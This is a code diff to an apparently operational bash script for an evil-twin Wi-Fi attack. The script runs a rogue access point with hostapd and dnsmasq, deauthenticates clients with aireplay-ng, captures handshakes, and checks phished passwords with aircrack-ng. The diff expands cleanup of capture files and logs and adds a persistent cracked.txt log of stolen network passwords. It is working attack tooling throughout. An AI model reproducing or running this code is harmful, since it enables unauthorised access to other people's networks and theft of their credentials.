@@ -28,21 +28,24 @@ cleanup() {
     log_info "Shutting down attack..."
     
     # Kill all background processes silently
-    sudo pkill -f hostapd 2>/dev/null
-    sudo pkill -f dnsmasq 2>/dev/null
-    sudo pkill -f airodump-ng 2>/dev/null
-    sudo pkill -f aireplay-ng 2>/dev/null
-    sudo fuser -k 5000/tcp 2>/dev/null
+     pkill -f hostapd 2>/dev/null
+     pkill -f dnsmasq 2>/dev/null
+     pkill -f airodump-ng 2>/dev/null
+     pkill -f aireplay-ng 2>/dev/null
+     pkill -f "php -S" 2>/dev/null
+     pkill -f passapi.py 2>/dev/null
+     fuser -k 5000/tcp 2>/dev/null
+     fuser -k 80/tcp 2>/dev/null
     
     # Remove virtual AP interface
-    sudo ip link set wlan1 down 2>/dev/null
-    sudo ip link del wlan1 2>/dev/null
+     ip link set wlan1 down 2>/dev/null
+     ip link del wlan1 2>/dev/null
     
     # Reset wlan2 from monitor mode SILENTLY
-    sudo airmon-ng stop wlan2 > /dev/null 2>&1
+     airmon-ng stop wlan2 > /dev/null 2>&1
     
     # Reset iptables
-    sudo iptables --flush 2>/dev/null
+     iptables --flush 2>/dev/null
     
     # Clean up routing rules silently
     ip rule del from all lookup main pref 1 2>/dev/null || true
@@ -52,8 +55,38 @@ cleanup() {
     ip rule del from all iif lo oif wlan1 lookup 97 pref 17000 2>/dev/null || true
     ip rule del from all iif wlan1 lookup main pref 21000 2>/dev/null || true
     
-    # Remove temp files
-    rm -f /tmp/target_bssid.txt /tmp/target_channel.txt /tmp/target_ssid.txt /tmp/scan*
+    # ==================== ENHANCED FILE CLEANUP ====================
+    log_info "Cleaning up temporary files..."
+    
+    # Remove all airodump-ng handshake files
+    rm -f evil-*.cap evil-*.csv evil-*.kismet.* evil-*.netxml
+    
+    # Remove temp scan files
+    rm -f /tmp/target_bssid.txt /tmp/target_channel.txt /tmp/target_ssid.txt 
+    rm -f /tmp/scan* /tmp/airodump.log /tmp/deauth.log
+    
+    # Remove nohup output files
+    rm -f nohup.out
+    
+    # Remove any .pcap files that might have been created
+    rm -f *.pcap
+    
+    # Clean up temporary password files BUT PRESERVE cracked.txt
+    rm -f attempts.txt password.txt
+    
+    # Clean up any handshake files created during this session
+    if [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ]; then
+        rm -f "$HANDSHAKE_FILE"
+    fi
+    
+    # Remove any SSID-based .cap files (safety check)
+    if [ -n "$TARGET_SSID" ]; then
+        SAFE_SSID=$(echo "$TARGET_SSID" | sed 's/[^a-zA-Z0-9]/_/g')
+        rm -f "${SAFE_SSID}.cap"
+    fi
+    
+    # Clean up process PID files if any
+    rm -f *.pid
     
     log_success "Cleanup complete"
     exit 0
@@ -445,7 +478,11 @@ monitor_attack() {
             if aircrack-ng "$HANDSHAKE_FILE" -b "$TARGET_BSSID" -w password.txt 2>/dev/null | grep -q "KEY FOUND"; then
                 echo ""
                 echo -e "${GREEN}PASSWORD CRACKED: $temp_pass${NC}"
-                echo "Saved in: password.txt"
+                
+                # Archive to permanent cracked.txt file
+                timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+                echo "$timestamp | SSID: $TARGET_SSID | BSSID: $TARGET_BSSID | Password: $temp_pass" >> cracked.txt
+                echo -e "${GREEN}Cracked Network Saved in: cracked.txt${NC}"
                 echo ""
                 
                 # Stop deauth immediately
